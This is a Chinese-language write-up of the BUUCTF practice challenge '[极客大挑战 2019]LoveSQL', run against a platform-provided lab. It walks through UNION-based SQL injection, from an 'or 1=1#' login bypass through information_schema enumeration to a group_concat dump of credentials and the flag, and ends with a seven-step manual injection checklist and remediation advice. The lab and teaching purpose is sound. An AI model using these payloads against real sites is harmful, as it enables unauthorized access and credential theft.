# CTF 练习：[极客大挑战 2019]LoveSQL（联合查询注入）

> 平台：CTF² / BUUCTF 练习（Web · 简单 · 1 分，4584 人解出）
> 环境：Kali + 浏览器
> 日期：2026-11-22
> 性质：平台提供的授权靶场

---

## 一、目标

登录框存在 SQL 注入，用万能密码进入后，通过 `check.php` 的 `username` 参数做联合查询注入，逐步导出数据库名、表名、列名，最终 dump 出 flag。

## 二、复现

### 2.1 万能密码

用户名：

```
admin' or 1=1#
```

密码任意。登录成功，页面显示：

```
Hello admin !
Your password is '61556cf199420a99fe33616aee6f4249'
```

URL 变成：

```
/check.php?username=admin'+or+1=1#&password=123
```

### 2.2 确定回显位

```
?username=1' union select 1,2,3#&password=1
```

页面：

```
Hello 2 !
Your password is '3'
```

→ 第 2 列显示在 Hello 后，第 3 列显示在 password。

### 2.3 查库名

```
?username=1' union select 1,database(),3#&password=1
```

```
Hello geek !
```

### 2.4 查表名

```
?username=1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#
```

```
geekuser, l0ve1ysq1
```

### 2.5 查列名

```
?username=1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='l0ve1ysq1'#
```

```
id,username,password
```

### 2.6 dump 数据

```
?username=1' union select 1,2,group_concat(username,0x3a,password) from l0ve1ysq1#
```

（`0x3a` 是冒号 `:` 的十六进制）

输出中有一段：

```
flag:CTF2{de05e039-a4c8-4daa-8af8-5ec17045dc1a}
```

## 三、结果

```
CTF2{de05e039-a4c8-4daa-8af8-5ec17045dc1a}
```

## 三·五、复盘四问

### 推理链（为什么这么做）

**第 1 步：为什么先用万能密码进去**

- 我在想：登录后才能到带参数的 `check.php`，那里才是注入点。
- 验证：`admin' or 1=1#` 登录成功，URL 变成 `check.php?username=...&password=...`。
- 所以：先拿入口，再做 UNION。

**第 2 步：为什么用 `union select 1,2,3`**

- 我在想：要确认列数和「哪一列显示在页面上」。
- 验证：页面显示 `Hello 2 ! Your password is '3'`。
- 所以：第 2、3 列是回显位，第 1 列不可见。

**第 3 步：为什么查库名、表名、列名**

- 我在想：不知道表结构就没法 dump。
- 验证：`database()` → `geek`；`information_schema.tables` → `geekuser,l0ve1ysq1`；列 → `id,username,password`。
- 所以：目标表是 `l0ve1ysq1`。

**第 4 步：为什么用 `group_concat`**

- 我在想：页面只显示一行，多行数据会被吞。
- 验证：`group_concat(username,0x3a,password)` 一次拼出所有账号密码。
- 所以：flag 出现在 `flag:CTF2{...}` 这一行。

### 载荷是怎么来的

- **来源**：按七步法手写，URL 编码后提交。
- **`0x3a`**：冒号的十六进制，用来分隔用户名和密码。
- **`#`**：注释掉原 SQL 剩余部分。

### 逐段解释

| 载荷 | 作用 |
|---|---|
| `admin' or 1=1#` | 绕过登录 |
| `1' union select 1,2,3#` | 定列数 + 找回显位 |
| `union select 1,database(),3` | 查库名 |
| `information_schema.tables` | 列表名 |
| `information_schema.columns` | 列列名 |
| `group_concat(username,0x3a,password)` | 一次 dump 所有账号 |

### 失败尝试与坑

| 现象 | 原因 | 解决 |
|---|---|---|
| URL 报错 | `'`、空格、`#` 没编码 | `%27`、`%20`、`%23` |
| 表名找不到 | 把 `l0ve1ysq1` 看成 `love1ysql` | 数字 0 和 1 |
| 输出被截断 | 单行限制 | 用 `group_concat` |

### 自测

**Q1**：怎么判断回显位？
**A**：`union select 1,2,3` 后看页面上出现哪些数字。

**Q2**：`information_schema` 里查什么？
**A**：`tables` 查表名，`columns` 查列名。

**Q3**：为什么用 `group_concat`？
**A**：把多行拼成一行，突破页面单行显示限制。

## 四、原理

| 点 | 说明 |
|---|---|
| 万能密码 | `' or 1=1#` 让 WHERE 恒真 |
| `#` 注释 | 截断后面的 `AND password='...'` |
| UNION 注入 | 列数一致即可把任意查询结果拼到回显位 |
| 信息库 | `information_schema` 提供表名/列名 |
| group_concat | 把多行拼成一行，突破单行回显限制 |

## 五、手工注入流程（背下来）

```
1. 判注入点：' or 1=1# / ' and 1=2#
2. 定列数：' union select 1,2,3#   （报错就加列）
3. 找回显：看哪几列显示在页面上
4. 查库名：union select 1,database(),3
5. 查表名：information_schema.tables
6. 查列名：information_schema.columns
7. 查数据：union select ... from 表名
```

## 六、修复

| 措施 | 说明 |
|---|---|
| **预处理语句** | `PDO` / `mysqli` 的 prepare + 参数绑定 |
| 输入校验 | 用户名只允许字母数字 |
| 最小权限 | 数据库账号只读必要表 |
| 关闭报错 | 不把 SQL 错误回显给用户 |
| WAF | 拦截 `union`/`information_schema` 等关键词（辅助手段） |

## 七、踩坑

- URL 里 `'`、空格、`#` 必须编码：`%27`、`%20`（或 `+`）、`%23`
- 表名是 `l0ve1ysq1`（数字 0 和 1，不是字母 o 和 l）
- 回显位只有 2 和 3，第 1 列看不到
- 长输出会被页面截断，用 `group_concat` 拼一起看

## 八、收获

- 完整走了一遍 UNION 注入的七步流程。
- 理解了 `information_schema` 是注入的「地图」。
- 知道回显位和列数的关系，报错就是加列的提示。
